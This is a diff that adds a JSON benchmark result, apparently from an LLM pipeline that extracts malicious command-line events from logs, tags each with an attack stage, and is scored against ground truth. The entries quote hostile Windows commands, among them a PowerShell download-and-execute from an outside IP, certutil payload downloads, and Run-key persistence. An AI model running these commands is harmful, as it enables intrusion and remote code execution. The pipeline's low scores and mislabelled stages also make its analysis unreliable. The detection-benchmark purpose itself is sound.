@@ -1,0 +1,108 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "servicingstartup /ISERVICE SSPSSERVICE",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "reg add HKCU\\Software\\Mozilla\\Services\\Update\\ChannelPrefs /v 0 /t REG_DWORD /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg delete HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run /v 'wg365' /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "wmic nic where ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\\\WINDOWS\\\\System32\\\\svchost.exe -k Netzwerk-Dienste -p -s DnsApi",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\\\WINDOWS\\\\System32\\\\svchost.exe -k Netzwerk-Dienste -p -s LanManWorkstation ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "Start-Process .\\T1059.003_script.bat",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/test.hta C:\\Users\\Administrator\\Desktop\\shell\\test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method POST -UseBasicParsing -ContentType application/json",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "A complex cyberattack unfolded across multiple segments. Initially, attackers gained entry through unidentified methods. Once inside, they established persistence through the Window Services Manager and Registry alterations. This allowed them to execute scripts remotely using HTTP calls and manipulate the user interface to evade detection. Attackers employed multiple techniques like registry manipulation and launching of malicious binaries from Unexpected locations to maintain control over the target system.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120876,
+      "completion_tokens": 5072,
+      "total_tokens": 125948,
+      "wall_clock_s": 134.484,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.125,
+      "recall": 0.14285714285714285,
+      "f1": 0.13333333333333333,
+      "tp": 2,
+      "fp": 14,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.0625,
+      "recall": 0.07142857142857142,
+      "f1": 0.06666666666666667,
+      "tp": 1,
+      "fp": 15,
+      "fn": 13,
+      "recall_partial": 0.10714285714285714
+    },
+    "hallucination_rate": 0.1111111111111111,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 120876,
+      "completion_tokens": 5072,
+      "total_tokens": 125948,
+      "wall_clock_s": 134.484,
+      "parse_retries": 2
+    }
+  }
+}
